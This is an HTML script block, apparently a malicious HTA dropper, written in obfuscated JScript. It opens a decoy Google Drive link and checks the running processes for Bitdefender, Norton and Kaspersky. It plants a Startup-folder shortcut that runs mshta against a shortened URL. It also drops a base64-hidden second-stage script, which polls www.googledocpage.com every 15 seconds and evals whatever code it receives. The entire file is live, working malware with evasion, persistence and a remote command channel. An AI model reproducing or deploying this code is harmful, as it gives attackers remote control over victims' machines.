<script language="javascript">

var w = "Wscrip";
var w = w + "t.Sh";
var a1 = "a";
var w = w + "ell";
var s = new ActiveXObject(w);
var c = "aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xdHJCUndxMTBEc09LMWJ4VWRZa2NncXM3d3BaWXJKbFIvdmlldw==";

function getProc()
{
	var objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\" + "." + "\\root\\cimv2");
	var prclst = objWMIService.ExecQuery("Select * from Win32_Process");

	var mainRes = "";
	procEnum = new Enumerator(prclst);
	for ( ; !procEnum.atEnd(); procEnum.moveNext())
	{
		var proc = procEnum.item();
		if (proc.Name.indexOf("svchost") === -1 && proc.ProcessID !== 0 && proc.ProcessID !== 4)
		{
			mainRes = mainRes + "\n" + proc.ProcessID + "\t" + proc.SessionID + "\t";
			if (!proc.CommandLine)
			{
				mainRes = mainRes + proc.Name.toLowerCase();
			}
			else
			{
				mainRes = mainRes + proc.CommandLine.toLowerCase();
			}
		}
	} 
	return mainRes;
}


var Base64 = {

    // private property
    _keyStr : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
    
    // public method for encoding
    encode : function (input) {
        var output = "";
        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
        var i = 0;
    
        input = Base64._utf8_encode(input);
    
        while (i < input.length) {
    
            chr1 = input.charCodeAt(i++);
            chr2 = input.charCodeAt(i++);
            chr3 = input.charCodeAt(i++);
    
            enc1 = chr1 >> 2;
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
            enc4 = chr3 & 63;
    
            if (isNaN(chr2)) {
                enc3 = enc4 = 64;
            } else if (isNaN(chr3)) {
                enc4 = 64;
            }
    
            output = output +
            this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) +
            this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);
    
        }
    
        return output;
    },
    
    // public method for decoding
    decode : function (input) {
        var output = "";
        var chr1, chr2, chr3;
        var enc1, enc2, enc3, enc4;
        var i = 0;
    
        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
    
        while (i < input.length) {
    
            enc1 = this._keyStr.indexOf(input.charAt(i++));
            enc2 = this._keyStr.indexOf(input.charAt(i++));
            enc3 = this._keyStr.indexOf(input.charAt(i++));
            enc4 = this._keyStr.indexOf(input.charAt(i++));
    
            chr1 = (enc1 << 2) | (enc2 >> 4);
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
            chr3 = ((enc3 & 3) << 6) | enc4;
    
            output = output + String.fromCharCode(chr1);
    
            if (enc3 != 64) {
                output = output + String.fromCharCode(chr2);
            }
            if (enc4 != 64) {
                output = output + String.fromCharCode(chr3);
            }
    
        }
    
        output = Base64._utf8_decode(output);
    
        return output;
    
    },
    
    // private method for UTF-8 encoding
    _utf8_encode : function (string) {
        string = string.replace(/\r\n/g,"\n");
        var utftext = "";
    
        for (var n = 0; n < string.length; n++) {
    
            var c = string.charCodeAt(n);
    
            if (c < 128) {
                utftext += String.fromCharCode(c);
            }
            else if((c > 127) && (c < 2048)) {
                utftext += String.fromCharCode((c >> 6) | 192);
                utftext += String.fromCharCode((c & 63) | 128);
            }
            else {
                utftext += String.fromCharCode((c >> 12) | 224);
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                utftext += String.fromCharCode((c & 63) | 128);
            }
    
        }
    
        return utftext;
    },
    
    // private method for UTF-8 decoding
    _utf8_decode : function (utftext) {
        var string = "";
        var i = 0;
        var c = c1 = c2 = 0;
    
        while ( i < utftext.length ) {
    
            c = utftext.charCodeAt(i);
    
            if (c < 128) {
                string += String.fromCharCode(c);
                i++;
            }
            else if((c > 191) && (c < 224)) {
                c2 = utftext.charCodeAt(i+1);
                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                i += 2;
            }
            else {
                c2 = utftext.charCodeAt(i+1);
                c3 = utftext.charCodeAt(i+2);
                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                i += 3;
            }
    
        }
    
        return string;
    }
    
}


c = "explorer " + "\"" + Base64.decode(c) + "\"";
s.Run(c);

var wish = new ActiveXObject("WScript.Shell");
var fs = new ActiveXObject("Scripting.FileSystemObject");

var vacOv = 0;

pl = getProc();
if (pl.indexOf("bdagent") >= 0 || pl.indexOf("epsecurityservice") >= 0)
{
	vacOv = 1;
}
if (pl.indexOf("ccsvchst") >= 0 || pl.indexOf("nortonsecurity") >= 0)
{
	vacOv = 2;
}

var stdir = wish.SpecialFolders("startup");

slf = fs.GetSpecialFolder(2) + "\\" + "MSEdge.lnk";
var ol = wish.CreateShortcut(slf);
ol.TargetPath = "mshta";
ol.Arguments = "ht" + "tps:" + "//bi" + "t.ly/" + "2R1dDn1";
ol.WindowStyle = "7"

if (vacOv === 0)
{
	ol.Save();
}

var ln = "DQp2YXIgaG9zdG5vZGU9IiI7DQp2YXIgdF9wcm90byA9ICJodHRwIjsNCg0KaWYgKFdTY3JpcHQuYXJndW1lbnRzLmxlbmd0aCA+IDApIHsNCiAgICBob3N0bm9kZSA9IFdTY3JpcHQuYXJndW1lbnRzKDApOw0KfSBlbHNlIHsNCglXU2NyaXB0LlF1aXQoKTsNCn0NCg0KaWYgKGlzTmFOKGhvc3Rub2RlLnN1YnN0cmluZygwLDEpKSA9PSB0cnVlKSB7DQogICAgdF9wcm90byA9ICJodHRwcyI7DQp9DQoNCnZhciBzenVybCA9IHRfcHJvdG8gKyAiOi8vIiArIGhvc3Rub2RlOw0KDQp2YXIgc3pVSUQgPSAiIjsNCg0KdmFyIEJhc2U2NCA9IHsNCg0KICAgIC8vIHByaXZhdGUgcHJvcGVydHkNCiAgICBfa2V5U3RyIDogIkFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky89IiwNCiAgICANCiAgICAvLyBwdWJsaWMgbWV0aG9kIGZvciBlbmNvZGluZw0KICAgIGVuY29kZSA6IGZ1bmN0aW9uIChpbnB1dCkgew0KICAgICAgICB2YXIgb3V0cHV0ID0gIiI7DQogICAgICAgIHZhciBjaHIxLCBjaHIyLCBjaHIzLCBlbmMxLCBlbmMyLCBlbmMzLCBlbmM0Ow0KICAgICAgICB2YXIgaSA9IDA7DQogICAgDQogICAgICAgIGlucHV0ID0gQmFzZTY0Ll91dGY4X2VuY29kZShpbnB1dCk7DQogICAgDQogICAgICAgIHdoaWxlIChpIDwgaW5wdXQubGVuZ3RoKSB7DQogICAgDQogICAgICAgICAgICBjaHIxID0gaW5wdXQuY2hhckNvZGVBdChpKyspOw0KICAgICAgICAgICAgY2hyMiA9IGlucHV0LmNoYXJDb2RlQXQoaSsrKTsNCiAgICAgICAgICAgIGNocjMgPSBpbnB1dC5jaGFyQ29kZUF0KGkrKyk7DQogICAgDQogICAgICAgICAgICBlbmMxID0gY2hyMSA+PiAyOw0KICAgICAgICAgICAgZW5jMiA9ICgoY2hyMSAmIDMpIDw8IDQpIHwgKGNocjIgPj4gNCk7DQogICAgICAgICAgICBlbmMzID0gKChjaHIyICYgMTUpIDw8IDIpIHwgKGNocjMgPj4gNik7DQogICAgICAgICAgICBlbmM0ID0gY2hyMyAmIDYzOw0KICAgIA0KICAgICAgICAgICAgaWYgKGlzTmFOKGNocjIpKSB7DQogICAgICAgICAgICAgICAgZW5jMyA9IGVuYzQgPSA2NDsNCiAgICAgICAgICAgIH0gZWxzZSBpZiAoaXNOYU4oY2hyMykpIHsNCiAgICAgICAgICAgICAgICBlbmM0ID0gNjQ7DQogICAgICAgICAgICB9DQogICAgDQogICAgICAgICAgICBvdXRwdXQgPSBvdXRwdXQgKw0KICAgICAgICAgICAgdGhpcy5fa2V5U3RyLmNoYXJBdChlbmMxKSArIHRoaXMuX2tleVN0ci5jaGFyQXQoZW5jMikgKw0KICAgICAgICAgICAgdGhpcy5fa2V5U3RyLmNoYXJBdChlbmMzKSArIHRoaXMuX2tleVN0ci5jaGFyQXQoZW5jNCk7DQogICAgDQogICAgICAgIH0NCiAgICANCiAgICAgICAgcmV0dXJuIG91dHB1dDsNCiAgICB9LA0KICAgIA0KICAgIC8vIHB1YmxpYyBtZXRob2QgZm9yIGRlY29kaW5nDQogICAgZGVjb2RlIDogZnVuY3Rpb24gKGlucHV0KSB7DQogICAgICAgIHZhciBvdXRwdXQgPSAiIjsNCiAgICAgICAgdmFyIGNocjEsIGNocjIsIGNocjM7DQogICAgICAgIHZhciBlbmMxLCBlbmMyLCBlbmMzLCBlbmM0Ow0KICAgICAgICB2YXIgaSA9IDA7DQogICAgDQogICAgICAgIGlucHV0ID0gaW5wdXQucmVwbGFjZSgvW15BLVphLXowLTlcK1wvXD1dL2csICIiKTsNCiAgICANCiAgICAgICAgd2hpbGUgKGkgPCBpbnB1dC5sZW5ndGgpIHsNCiAgICANCiAgICAgICAgICAgIGVuYzEgPSB0aGlzLl9rZXlTdHIuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7DQogICAgICAgICAgICBlbmMyID0gdGhpcy5fa2V5U3RyLmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpOw0KICAgICAgICAgICAgZW5jMyA9IHRoaXMuX2tleVN0ci5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTsNCiAgICAgICAgICAgIGVuYzQgPSB0aGlzLl9rZXlTdHIuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7DQogICAgDQogICAgICAgICAgICBjaHIxID0gKGVuYzEgPDwgMikgfCAoZW5jMiA+PiA0KTsNCiAgICAgICAgICAgIGNocjIgPSAoKGVuYzIgJiAxNSkgPDwgNCkgfCAoZW5jMyA+PiAyKTsNCiAgICAgICAgICAgIGNocjMgPSAoKGVuYzMgJiAzKSA8PCA2KSB8IGVuYzQ7DQogICAgDQogICAgICAgICAgICBvdXRwdXQgPSBvdXRwdXQgKyBTdHJpbmcuZnJvbUNoYXJDb2RlKGNocjEpOw0KICAgIA0KICAgICAgICAgICAgaWYgKGVuYzMgIT0gNjQpIHsNCiAgICAgICAgICAgICAgICBvdXRwdXQgPSBvdXRwdXQgKyBTdHJpbmcuZnJvbUNoYXJDb2RlKGNocjIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKGVuYzQgIT0gNjQpIHsNCiAgICAgICAgICAgICAgICBvdXRwdXQgPSBvdXRwdXQgKyBTdHJpbmcuZnJvbUNoYXJDb2RlKGNocjMpOw0KICAgICAgICAgICAgfQ0KICAgIA0KICAgICAgICB9DQogICAgDQogICAgICAgIG91dHB1dCA9IEJhc2U2NC5fdXRmOF9kZWNvZGUob3V0cHV0KTsNCiAgICANCiAgICAgICAgcmV0dXJuIG91dHB1dDsNCiAgICANCiAgICB9LA0KICAgIA0KICAgIC8vIHByaXZhdGUgbWV0aG9kIGZvciBVVEYtOCBlbmNvZGluZw0KICAgIF91dGY4X2VuY29kZSA6IGZ1bmN0aW9uIChzdHJpbmcpIHsNCiAgICAgICAgc3RyaW5nID0gc3RyaW5nLnJlcGxhY2UoL1xyXG4vZywiXG4iKTsNCiAgICAgICAgdmFyIHV0ZnRleHQgPSAiIjsNCiAgICANCiAgICAgICAgZm9yICh2YXIgbiA9IDA7IG4gPCBzdHJpbmcubGVuZ3RoOyBuKyspIHsNCiAgICANCiAgICAgICAgICAgIHZhciBjID0gc3RyaW5nLmNoYXJDb2RlQXQobik7DQogICAgDQogICAgICAgICAgICBpZiAoYyA8IDEyOCkgew0KICAgICAgICAgICAgICAgIHV0ZnRleHQgKz0gU3RyaW5nLmZyb21DaGFyQ29kZShjKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UgaWYoKGMgPiAxMjcpICYmIChjIDwgMjA0OCkpIHsNCiAgICAgICAgICAgICAgICB1dGZ0ZXh0ICs9IFN0cmluZy5mcm9tQ2hhckNvZGUoKGMgPj4gNikgfCAxOTIpOw0KICAgICAgICAgICAgICAgIHV0ZnRleHQgKz0gU3RyaW5nLmZyb21DaGFyQ29kZSgoYyAmIDYzKSB8IDEyOCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIHsNCiAgICAgICAgICAgICAgICB1dGZ0ZXh0ICs9IFN0cmluZy5mcm9tQ2hhckNvZGUoKGMgPj4gMTIpIHwgMjI0KTsNCiAgICAgICAgICAgICAgICB1dGZ0ZXh0ICs9IFN0cmluZy5mcm9tQ2hhckNvZGUoKChjID4+IDYpICYgNjMpIHwgMTI4KTsNCiAgICAgICAgICAgICAgICB1dGZ0ZXh0ICs9IFN0cmluZy5mcm9tQ2hhckNvZGUoKGMgJiA2MykgfCAxMjgpOw0KICAgICAgICAgICAgfQ0KICAgIA0KICAgICAgICB9DQogICAgDQogICAgICAgIHJldHVybiB1dGZ0ZXh0Ow0KICAgIH0sDQogICAgDQogICAgLy8gcHJpdmF0ZSBtZXRob2QgZm9yIFVURi04IGRlY29kaW5nDQogICAgX3V0ZjhfZGVjb2RlIDogZnVuY3Rpb24gKHV0ZnRleHQpIHsNCiAgICAgICAgdmFyIHN0cmluZyA9ICIiOw0KICAgICAgICB2YXIgaSA9IDA7DQogICAgICAgIHZhciBjID0gYzEgPSBjMiA9IDA7DQogICAgDQogICAgICAgIHdoaWxlICggaSA8IHV0ZnRleHQubGVuZ3RoICkgew0KICAgIA0KICAgICAgICAgICAgYyA9IHV0ZnRleHQuY2hhckNvZGVBdChpKTsNCiAgICANCiAgICAgICAgICAgIGlmIChjIDwgMTI4KSB7DQogICAgICAgICAgICAgICAgc3RyaW5nICs9IFN0cmluZy5mcm9tQ2hhckNvZGUoYyk7DQogICAgICAgICAgICAgICAgaSsrOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZSBpZigoYyA+IDE5MSkgJiYgKGMgPCAyMjQpKSB7DQogICAgICAgICAgICAgICAgYzIgPSB1dGZ0ZXh0LmNoYXJDb2RlQXQoaSsxKTsNCiAgICAgICAgICAgICAgICBzdHJpbmcgKz0gU3RyaW5nLmZyb21DaGFyQ29kZSgoKGMgJiAzMSkgPDwgNikgfCAoYzIgJiA2MykpOw0KICAgICAgICAgICAgICAgIGkgKz0gMjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2Ugew0KICAgICAgICAgICAgICAgIGMyID0gdXRmdGV4dC5jaGFyQ29kZUF0KGkrMSk7DQogICAgICAgICAgICAgICAgYzMgPSB1dGZ0ZXh0LmNoYXJDb2RlQXQoaSsyKTsNCiAgICAgICAgICAgICAgICBzdHJpbmcgKz0gU3RyaW5nLmZyb21DaGFyQ29kZSgoKGMgJiAxNSkgPDwgMTIpIHwgKChjMiAmIDYzKSA8PCA2KSB8IChjMyAmIDYzKSk7DQogICAgICAgICAgICAgICAgaSArPSAzOw0KICAgICAgICAgICAgfQ0KICAgIA0KICAgICAgICB9DQogICAgDQogICAgICAgIHJldHVybiBzdHJpbmc7DQogICAgfQ0KICAgIA0KfQ0KLy8gICAgdmFyIGVuY29kZWRTdHJpbmcgPSBCYXNlNjQuZW5jb2RlKHN0cmluZyk7DQovLyAgICB2YXIgZGVjb2RlZFN0cmluZyA9IEJhc2U2NC5kZWNvZGUoZW5jb2RlZFN0cmluZyk7DQoNCmZ1bmN0aW9uIGdldFVJRCgpDQp7DQoJdmFyIHN1aWQgPSBXU2NyaXB0LmFyZ3VtZW50cygxKTsNCgl2YXIgYiA9IE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIDEwKTsNCglpZiAoYiA8IDEpDQoJew0KCQliID0gMTsNCgl9DQogICAgdmFyIHJVSUQgPSBiLnRvU3RyaW5nKCk7Ow0KCXZhciBjbyA9IDA7DQoJaWYgKHN1aWQubGVuZ3RoID4gMCkNCgl7DQoJCWNvID0gODsNCgl9DQoJZWxzZQ0KCXsNCgkJY28gPSA5Ow0KCQlzdWlkID0gIiI7DQoJfQ0KICAgIGZvcih2YXIgaSA9IDE7IGkgPCBjbzsgaSArKykNCiAgICB7DQogICAgICAgIHZhciBhID0gTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogMTApOw0KICAgICAgICByVUlEID0gclVJRCArIGEudG9TdHJpbmcoKTsNCiAgICB9DQoJclVJRCA9IHJVSUQgKyBzdWlkOw0KICAgIHJldHVybiByVUlEOw0KfQ0KDQpmdW5jdGlvbiBwb3N0cmVxdWVzdChwb3N0ZGF0YSkNCnsNCiAgICB2YXIgU2VydmVyWG1sSHR0cCA9IG5ldyBBY3RpdmVYT2JqZWN0KCJNU1hNTDIuU2VydmVyWE1MSFRUUC42LjAiKQ0KICAgIHZhciBzelJlcyA9ICIiOw0KICAgaWYgKHBvc3RkYXRhLmxlbmd0aCA+IDApIHsNCiAgICAgICAgdmFyIGJhc2VFbkRhdGEgPSBwb3N0ZGF0YTsNCiAgICAgICAgdHJ5ew0KICAgICAgICAgICAgU2VydmVyWG1sSHR0cC5zZXRPcHRpb24oMiwgMTMwNTYpOw0KICAgICAgICAgICAgU2VydmVyWG1sSHR0cC5vcGVuKCJQT1NUIiwgc3p1cmwpOw0KICAgICAgICAgICAgU2VydmVyWG1sSHR0cC5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LVR5cGUiLCAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIik7DQogICAgICAgICAgICBTZXJ2ZXJYbWxIdHRwLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtTGVuZ3RoIiwgYmFzZUVuRGF0YS5sZW5ndGgpOw0KICAgICAgICAgICAgU2VydmVyWG1sSHR0cC5zZW5kKGJhc2VFbkRhdGEpOw0KDQogICAgICAgICAgICBzelJlcyA9IFNlcnZlclhtbEh0dHAucmVzcG9uc2VUZXh0Ow0KICAgICAgICAgICAgU2VydmVyWG1sSHR0cCA9IG51bGw7DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2ggKGUpIHsNCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gc3pSZXM7DQp9DQoNCmZ1bmN0aW9uIGVjdmFsKGR0KQ0Kew0KCWV2YWwoZHQpOw0KfQ0KDQpzelVJRCA9IGdldFVJRCgpOw0Kd2hpbGUoIDEgPiAwKQ0Kew0KICAgIHZhciBwb3N0RCA9ICJhIiArIHN6VUlEICsgIjEiOw0KICAgIHZhciByZXRWID0gcG9zdHJlcXVlc3QocG9zdEQpOw0KDQogICAgaWYocmV0Vi5sZW5ndGggPiAwKQ0KICAgIHsNCiAgICAgICAgdmFyIHN6SnNjciA9IEJhc2U2NC5kZWNvZGUocmV0VikrIjsiOw0KICAgICAgICB0cnkNCiAgICAgICAgew0KICAgICAgICAgICAgZWN2YWwoc3pKc2NyKTsNCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCAoZSl7DQoNCiAgICAgICAgfQ0KICAgIH0NCiAgICBXU2NyaXB0LlNsZWVwKDE1ICogMTAwMCk7DQp9";
var pf = fs.GetSpecialFolder(2) + "\\otutyqt.js";

function WriteFile(pdata, szPath) 
{
   var fso  = new ActiveXObject("Scripting.FileSystemObject"); 
   var fh = fso.CreateTextFile(szPath, 2, true);
   fh.WriteLine(pdata); 
   fh.Close(); 
}

var lns = Base64.decode(ln);
WriteFile(lns, pf);

var ex="ws";
if (pl.indexOf("kw"+"sprot") !== -1 || pl.indexOf("npp"+"rot") !== -1)
{
    ex = "cs";
}

var ln1 = "star" + "t /b " + ex + "cr" + "ipt \"" + pf + "\" " + "www.googledocpage.com/";

var fln = "c" + "md" + " /c " + ln1 + " 1" + " & " + ln1 + " 2";
if (vacOv === 0 && pl.indexOf("kwsprot") === -1)
{
	fln = fln + " & move \"" + slf + "\" \"" + stdir + "\\\"";
}

wish.run(fln, 0, false);

window.close();

</script>
